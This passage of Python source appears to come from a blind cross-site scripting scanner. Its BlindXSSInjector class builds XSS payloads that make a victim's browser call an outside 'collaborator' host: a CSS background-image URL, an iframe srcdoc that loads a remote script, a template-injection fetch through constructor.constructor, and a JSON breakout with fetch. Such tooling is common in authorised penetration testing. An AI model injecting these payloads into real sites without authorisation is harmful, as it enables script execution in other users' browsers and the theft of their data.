...
def normalize_collaborator_url(url: str) -> str:
    """Ensure collaborator URL has a scheme for reliable browser requests."""
    url = (url or '').strip()
    if not url:
        return url
    if url.startswith('//'):
...
class BlindXSSInjector:
    ...
    def __init__(self, collaborator_url: str, output_dir: str = 'output'):
        ...
        self.collaborator_url = normalized.rstrip('/')
    ...
    def generate_payloads(self, url: str, param_name: str) -> List[str]:
        ...
        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'";background-image:url({callback});"'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'css_background_url')

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'"><iframe srcdoc=\'<script src={callback}></script>\'></iframe>'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'iframe_srcdoc')

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'{{{{constructor.constructor("fetch(\\"{callback}\\")")()}}}}'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'template_injection')

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'"}};fetch("{callback}");//'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'json_breakout')
